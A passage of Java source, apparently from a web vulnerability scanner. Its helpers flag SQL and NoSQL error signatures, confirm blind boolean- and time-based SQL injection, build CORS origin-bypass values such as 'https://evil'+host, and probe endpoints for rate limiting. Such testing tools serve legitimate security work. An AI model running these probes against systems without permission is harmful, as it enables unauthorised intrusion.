                || lower.startsWith("//" + host) || lower.equals(host) || lower.startsWith(host + "/")) {
            return Optional.of(location);
        }
        return Optional.empty();
    }

    /** True if {@code body} contains a recognizable database-error signature. */
    static boolean containsSqlError(String body) {
        return body != null && !body.isEmpty() && SQL_ERROR.matcher(body).find();
    }

    /** True when a NoSQL (Mongo-style) driver/parser error signature is present. */
    static boolean containsNoSqlError(String body) {
        return body != null && !body.isEmpty() && NOSQL_ERROR.matcher(body).find();
    }

    /**
     * Boolean-based blind confirmation: the always-true payload's response should look like the
     * baseline (same underlying condition held), while the always-false payload's response should
     * diverge from both — the classic boolean-blind divergence signature.
     */
    static boolean looksBooleanBased(String baselineBody, String trueBody, String falseBody) {
        if (baselineBody == null || trueBody == null || falseBody == null) return false;
        boolean trueMatchesBaseline = closeEnough(baselineBody, trueBody);
        boolean falseMatchesBaseline = closeEnough(baselineBody, falseBody);
        boolean trueMatchesFalse = closeEnough(trueBody, falseBody);
        return trueMatchesBaseline && !falseMatchesBaseline && !trueMatchesFalse;
    }

    /** Two response bodies are "the same page" if identical, or within ~1% (min 5 chars) in length. */
    static boolean closeEnough(String a, String b) {
        if (a == null || b == null) return false;
        if (a.equals(b)) return true;
        int diff = Math.abs(a.length() - b.length());
        int tolerance = Math.max(5, Math.max(a.length(), b.length()) / 100);
        return diff <= tolerance;
    }

    /** Time-based blind confirmation: the payload response took at least ~{@code delaySeconds} longer. */
    static boolean looksTimeBased(long baselineMillis, long payloadMillis, int delaySeconds) {
        long expectedDelta = delaySeconds * 1000L;
        return (payloadMillis - baselineMillis) >= expectedDelta - 1000;
    }

    /**
     * Attacker-chosen {@code Origin} values worth trying against {@code host}: an origin wholly
     * unrelated to the target (catches "trust anything"), the {@code null} origin (sandboxed
     * iframes/data: URLs), and — when the host is known — three payloads that specifically defeat
     * common naive origin-validation bugs: appending an attacker suffix after the trusted host (naive
     * {@code startsWith}/{@code contains} checks), prepending "evil" directly onto the host with no
     * separator (naive {@code endsWith}/{@code contains} checks missing a dot-boundary requirement),
     * and downgrading the scheme (checks that compare only the host, ignoring scheme).
     */
    static List<String> craftCorsProbeOrigins(String host) {
        List<String> origins = new ArrayList<>();
        origins.add(CORS_ARBITRARY_ORIGIN);
        origins.add(CORS_NULL_ORIGIN);
        if (host != null && !host.isBlank()) {
            origins.add("https://" + host + ".recon-hound-probe.invalid");
            origins.add("https://evil" + host);
            origins.add("http://" + host);
        }
        return origins;
    }

    /** True if the server trusted our crafted Origin by reflecting it back verbatim. */
    static boolean corsReflectsOrigin(String sentOrigin, String acao) {
        return sentOrigin != null && acao != null && acao.trim().equalsIgnoreCase(sentOrigin.trim());
    }

    /** Best-effort host extraction for building host-dependent CORS bypass payloads; null on failure. */
    static String hostOf(String url) {
        try {
            return url == null ? null : URI.create(url).getHost();
        } catch (Exception e) {
            return null;
        }
    }

    /** True if the URL's path suggests it guards a sensitive operation worth rate-limit testing. */
    static boolean looksLikeSensitiveEndpoint(String url) {
        if (url == null) return false;
        String lower = url.toLowerCase(Locale.ROOT);
        for (String hint : SENSITIVE_ENDPOINT_HINTS) if (lower.contains(hint)) return true;
        return false;
    }

    /** True if any response in the burst shows a rate-limit signal: status, Retry-After, or body wording. */
    static boolean anyRateLimited(List<Integer> statusCodes, List<String> bodies, List<String> retryAfters) {
        if (statusCodes == null) return false;
        for (int i = 0; i < statusCodes.size(); i++) {
            Integer status = statusCodes.get(i);
            if (status != null && RATE_LIMIT_STATUS_CODES.contains(status)) return true;

            String retryAfter = retryAfters != null && i < retryAfters.size() ? retryAfters.get(i) : null;
            if (retryAfter != null && !retryAfter.isBlank()) return true;

            String body = bodies != null && i < bodies.size() ? bodies.get(i) : null;
            if (body != null) {
                String lower = body.toLowerCase(Locale.ROOT);
                for (String hint : RATE_LIMIT_BODY_HINTS) if (lower.contains(hint)) return true;
            }
        }
        return false;
    }

    static String encodeCorrelation(String testClass, String parameter, String url) {
        return "AC|" + testClass + "|" + parameter + "|" + (url == null ? "" : url.replace("|", "%7C"));
    }

    static String[] decodeCorrelation(String customData) {
        if (customData == null || !customData.startsWith("AC|")) return null;
        String[] parts = customData.split("\\|", 4);
        if (parts.length != 4) return null;
        return new String[]{parts[1], parts[2], parts[3].replace("%7C", "|")};
    }
}
